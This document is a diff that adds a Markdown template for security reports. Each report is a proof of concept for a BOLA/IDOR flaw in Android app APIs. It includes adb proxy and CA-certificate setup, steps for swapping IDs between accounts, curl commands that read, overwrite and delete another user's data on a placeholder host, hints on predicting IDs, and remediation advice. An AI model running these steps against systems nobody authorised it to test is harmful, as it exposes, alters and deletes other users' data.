@@ -1,0 +1,89 @@
+# PoC: BOLA/IDOR Vulnerability — {{ finding.title }}
+
+## Classification
+| Field | Value |
+|---|---|
+| **CWE** | {{ cwe }} |
+| **Severity** | {{ severity }} |
+| **CVSS** | {{ cvss }} |
+| **Component** | {{ class_name }} |
+
+## Description
+{{ description }}
+
+## Prerequisites
+- Two test accounts on the target application
+- HTTP proxy tool (Burp Suite, mitmproxy, or similar)
+- Android device with proxy configured
+- SSL pinning bypassed (if applicable)
+
+## Steps to Reproduce
+
+### 1. Set Up HTTP Proxy
+```bash
+# Configure device proxy to Burp/mitmproxy
+adb shell settings put global http_proxy <proxy_ip>:8080
+
+# Install proxy CA certificate on device
+adb push burp-ca.der /sdcard/
+# Settings → Security → Install from storage
+```
+
+### 2. Capture Authenticated Requests
+```
+1. Log in as User A (victim account)
+2. Navigate to the feature related to {{ class_name }}
+3. Observe API requests in the proxy — note the resource IDs and endpoints
+4. Look for patterns like: /api/users/{user_id}/data, /api/orders/{order_id}
+```
+
+### 3. Test for IDOR
+```
+1. Log in as User B (attacker account)
+2. Capture the same API request
+3. Replace User B's resource ID with User A's resource ID
+4. Forward the modified request
+```
+
+### 4. Automated Testing
+```bash
+# Use curl to test with different auth tokens
+# Replace TOKEN_B with attacker's token, USER_A_ID with victim's ID
+
+# Read access test
+curl -H "Authorization: Bearer TOKEN_B" \
+  "https://api.target.com/api/users/USER_A_ID/profile"
+
+# Write access test
+curl -X PUT -H "Authorization: Bearer TOKEN_B" \
+  -H "Content-Type: application/json" \
+  -d '{"name": "hacked"}' \
+  "https://api.target.com/api/users/USER_A_ID/profile"
+
+# Delete access test
+curl -X DELETE -H "Authorization: Bearer TOKEN_B" \
+  "https://api.target.com/api/users/USER_A_ID/data"
+```
+
+### 5. ID Pattern Analysis
+```
+Check for predictable IDs:
+- Sequential integers: 1001, 1002, 1003
+- UUID v1 (time-based): can be predicted
+- Base64 encoded IDs: decode and modify
+- GraphQL node IDs: decode relay-style IDs
+```
+
+## Expected Result
+- User B can access/modify/delete User A's resources using User A's IDs
+- The API does not verify that the authenticated user owns the requested resource
+- Sensitive data from other users is returned in the response
+
+## Impact
+An attacker can access, modify, or delete any user's data by manipulating resource identifiers. This can lead to:
+- Mass data exfiltration of all user records
+- Unauthorized modification of user profiles, orders, or settings
+- Privacy violations affecting all application users
+
+## Remediation
+{{ remediation or "1. Implement server-side authorization checks that verify the authenticated user owns the requested resource\n2. Use indirect object references (mapping user-specific tokens to server-side IDs)\n3. Avoid exposing sequential or predictable resource IDs\n4. Implement rate limiting on API endpoints\n5. Add access control unit tests for every endpoint" }}
